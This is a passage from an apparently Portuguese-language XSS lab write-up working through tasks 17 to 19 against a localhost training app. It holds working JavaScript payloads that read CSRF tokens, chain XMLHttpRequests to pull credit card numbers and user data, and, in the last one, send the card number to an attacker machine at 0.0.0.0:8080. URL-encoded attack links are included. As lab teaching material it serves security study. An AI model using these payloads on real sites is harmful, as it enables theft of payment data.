5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
		<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">};</span>
<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">csrf_token</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/17/creditCard/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">user=h41stur&amp;csrf_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">token</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/17/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E">http://localhost/17/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E</a></ul><p>Ao acessar a URL, temos o número do cartão impresso na tela.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-47.png" alt="Resultado" /></p><h4 id="referências-16">Referências</h4><ul><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX">https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest</a></ul><h3 id="task-18---html-parsing-of-xmlhttprequest"><em>Task 18 - HTML Parsing of XMLHttpRequest</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-48.png" alt="Task 18" /></p><h4 id="objetivo-18">Objetivo</h4><p>Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.</p><p>O objetivo desta <em>task</em>, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar os dados sensíveis contidos em outro <em>endpoint</em> da aplicação com uma requisição do tipo GET usando <code class="language-plaintext highlighter-rouge">XMLHttpRequest()</code>. Após obter estes dados, eles precisam ser inseridos em um elemento chamado <code class="language-plaintext highlighter-rouge">exploit</code> que está na tela inicial.</p><p>Porém, neste caso, o <em>endpoint</em> que contém os dados, não é uma API que retorna uma <em>string</em>, e sim uma página HTML completa que precisa de <em>parsing</em> para obter os dados corretos.</p><h4 id="conhecimento-base-17">Conhecimento Base</h4><p>A propriedade <code class="language-plaintext highlighter-rouge">responseType</code> do objeto <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code> é uma <em>string</em> que define o tipo de dados que você espera da resposta. Isso permite que você informe ao navegador como processar a resposta.</p><p>Os possíveis valores para <code class="language-plaintext highlighter-rouge">responseType</code> são:</p><ul><li><code class="language-plaintext highlighter-rouge">""</code> (<em>string</em> vazia): O padrão, também conhecido como <code class="language-plaintext highlighter-rouge">text</code>. A resposta é retornada como uma <em>string</em>.<li><code class="language-plaintext highlighter-rouge">"arraybuffer"</code>: A resposta é retornada como um <em>ArrayBuffer</em>.<li><code class="language-plaintext highlighter-rouge">"blob"</code>: A resposta é retornada como um <em>Blob</em>.<li><code class="language-plaintext highlighter-rouge">"document"</code>: A resposta é retornada como um Documento HTML ou XML.<li><code class="language-plaintext highlighter-rouge">"json"</code>: A resposta é interpretada como JSON e retornada como um objeto JavaScript.<li><code class="language-plaintext highlighter-rouge">"text"</code>: A resposta é retornada como uma <em>string</em> de texto.<li><code class="language-plaintext highlighter-rouge">"ms-stream"</code>: Específico da Microsoft, usado para <em>streaming</em>.</ul><p>Você define a propriedade <code class="language-plaintext highlighter-rouge">responseType</code> após o método <code class="language-plaintext highlighter-rouge">open</code> mas antes do método <code class="language-plaintext highlighter-rouge">send</code>.</p><p>É importante ressaltar que quando usamos o <code class="language-plaintext highlighter-rouge">responseTupe = "document"</code> precisamos usar a propriedade <code class="language-plaintext highlighter-rouge">responseXML</code> para armazenar o <em>response</em>.</p><h4 id="exploração-17">Exploração</h4><p>A primeira ação a ser feita é entender a arquitetura, ao clicar em “<em>User data</em>” somos levados à página de destino.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-49.png" alt="Destino" /></p><p>Como podemos ver, temos os dados sensíveis em um HTML inteiro, isso significa que se utilizarmos <code class="language-plaintext highlighter-rouge">responseText</code> para capturarmos a resposta, todo o código HTML será interpretado com uma <em>string</em>, impossibilitando o carregamento dos dados sensíveis.</p><p>Ao olharmos o código HTML do alvo, podemos ver que os dados estão em um parágrafo cujo ID é <code class="language-plaintext highlighter-rouge">user_data</code>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-50.png" alt="Dados" /></p><p>Portanto, podemos usar a propriedade <code class="language-plaintext highlighter-rouge">responseType</code> para definirmos o tipo da resposta como <code class="language-plaintext highlighter-rouge">document</code>. Isso fará com que a resposta seja interpretada como HTML ou XML, nos permitindo tratá-la como qualquer outro documento, podendo assim extrair valores.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">){</span>
		<span class="kd">var</span> <span class="nx">htmlPage</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">responseXML</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">user_data</span> <span class="o">=</span> <span class="nx">htmlPage</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">user_data</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">;</span>
		<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">user_data</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">};</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/18/user/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">req</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%7B%0A%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09var%20user_data%20%3D%20htmlPage.getElementById%28%22user_data%22%29.innerHTML%3B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20user_data%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F18%2Fuser%2F%22%2C%20true%29%3B%0Areq.responseType%20%3D%20%22document%22%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/18/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%7B%0A%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09var%20user_data%20%3D%20htmlPage.getElementById%28%22user_data%22%29.innerHTML%3B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20user_data%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F18%2Fuser%2F%22%2C%20true%29%3B%0Areq.responseType%20%3D%20%22document%22%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E">http://localhost/18/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%7B%0A%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09var%20user_data%20%3D%20htmlPage.getElementById%28%22user_data%22%29.innerHTML%3B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20user_data%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F18%2Fuser%2F%22%2C%20true%29%3B%0Areq.responseType%20%3D%20%22document%22%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E</a></ul><p>Ao acessar a URL, temos os dados impressos na tela.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-51.png" alt="Resultado" /></p><h4 id="referências-17">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseType">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseType</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest</a></ul><h3 id="task-19---html-parsing-multi-level"><em>Task 19 - HTML Parsing Multi-Level</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-52.png" alt="Task 19" /></p><h4 id="objetivo-19">Objetivo</h4><p>Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.</p><p>O objetivo desta <em>task</em>, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar os dados sensíveis contidos em outro <em>endpoint</em> da aplicação, porém, existe mais de um nível de acesso, neste caso, após uma solicitação do tipo GET, existe um formulário que valida um ID para entregar os dados. Após obter estes dados, eles precisam ser inseridos em um elemento chamado <code class="language-plaintext highlighter-rouge">exploit</code> que está na tela inicial, além de enviá-lo para uma máquina sob controle do atacante.</p><h4 id="conhecimento-base-18">Conhecimento Base</h4><p>Independente da quantidade de níveis necessários para montar um ataque, é possível aninhar várias requisições utilizando o <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code> para que o objetivo final seja atingido.</p><h4 id="exploração-18">Exploração</h4><p>Para melhor entendimento da arquitetura da aplicação, o exploit será feito em partes. A primeira coisa a se observar é a tela inicial que contém um link e um ID.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-53.png" alt="Tela inicial" /></p><p>Ao inspecionar o código HTML, vemos que o <em>link</em> está em um <code class="language-plaintext highlighter-rouge">h2</code> com id <code class="language-plaintext highlighter-rouge">config</code>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-54.png" alt="Config" /></p><p>Ao clicar no <em>link</em> somos levados para um formulário que solicita o ID informado na tela anterior.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-55.png" alt="Form" /></p><p>Neste ponto, podemos iniciar a construção do script capturando o <em>link</em> inicial e o ID contido no elemento, fazendo a <em>request</em> e armazenando sua resposta em um objeto HTML.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">config</span><span class="dl">"</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">link</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">:</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
	<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
	<span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
			<span class="kd">var</span> <span class="nx">htmlPage</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">responseXML</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">link</span><span class="p">.</span><span class="nx">href</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
	<span class="nx">req</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">;</span>
	<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Inspecionando o HTML da segunda tela, podemos verificar alguns pontos importantes.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-56.png" alt="Form" /></p><ul><li>O método utilizado é POST<li>O <code class="language-plaintext highlighter-rouge">action</code> do formulário aponta para o <em>endpoint</em> <code class="language-plaintext highlighter-rouge">../creditCard/</code><li>A aplicação implementa um <em>CSRF token</em> dinâmico.<li>O campo <code class="language-plaintext highlighter-rouge">user_id</code> recebe o ID capturado da tela anterior</ul><p>Ao preencher o formulário com o ID, somos levados a outra página HTML com os dados sensíveis.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-57.png" alt="Dados" /></p><p>Com estas informações, podemos extrair os dados da segunda página, e aninhar a segunda requisição, capturando sua resposta em um objeto HTML.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">config</span><span class="dl">"</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">link</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">:</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
	<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
	<span class="kd">var</span> <span class="nx">req2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
	
	<span class="nx">req2</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">req2</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
			<span class="kd">var</span> <span class="nx">htmlPage</span> <span class="o">=</span> <span class="nx">req2</span><span class="p">.</span><span class="nx">responseXML</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	
	<span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
			<span class="kd">var</span> <span class="nx">htmlPage</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">responseXML</span><span class="p">;</span>
			<span class="nx">csrf_token</span> <span class="o">=</span> <span class="nx">htmlPage</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
			<span class="nx">req2</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/19/creditCard/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
			<span class="nx">req2</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
			<span class="nx">req2</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">;</span>
			<span class="nx">req2</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">user_id=</span><span class="dl">"</span><span class="o">+</span><span class="nx">id</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;csrf_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">csrf_token</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">link</span><span class="p">.</span><span class="nx">href</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
	<span class="nx">req</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">;</span>
	<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Ao inspecionar o HTML da página alvo, podemos ver que o número de cartão de crédito está em um parágrafo cujo ID é <code class="language-plaintext highlighter-rouge">credit_card</code>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-58.png" alt="Credit card" /></p><p>Com estas informações, podemos implementar no segundo <em>request</em> a captura do valor do campo, a inclusão na <em>tag</em> <code class="language-plaintext highlighter-rouge">exploit</code> da página inicial e enviá-lo para a máquina sob controle do atacante.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">config</span><span class="dl">"</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">link</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">:</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
	<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
	<span class="kd">var</span> <span class="nx">req2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
	
	<span class="nx">req2</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">req2</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
			<span class="kd">var</span> <span class="nx">htmlPage</span> <span class="o">=</span> <span class="nx">req2</span><span class="p">.</span><span class="nx">responseXML</span><span class="p">;</span>
			<span class="nx">credit_card</span> <span class="o">=</span> <span class="nx">htmlPage</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">credit_card</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">;</span>
			<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">credit_card</span><span class="p">;</span>
			<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://0.0.0.0:8080/?credit_card=</span><span class="dl">"</span><span class="o">+</span><span class="nx">credit_card</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	
	<span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
			<span class="kd">var</span> <span class="nx">htmlPage</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">responseXML</span><span class="p">;</span>
			<span class="nx">csrf_token</span> <span class="o">=</span> <span class="nx">htmlPage</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
			<span class="nx">req2</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/19/creditCard/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
			<span class="nx">req2</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
			<span class="nx">req2</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">;</span>
			<span class="nx">req2</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">user_id=</span><span class="dl">"</span><span class="o">+</span><span class="nx">id</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;csrf_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">csrf_token</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">link</span><span class="p">.</span><span class="nx">href</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
	<span class="nx">req</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">;</span>
	<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
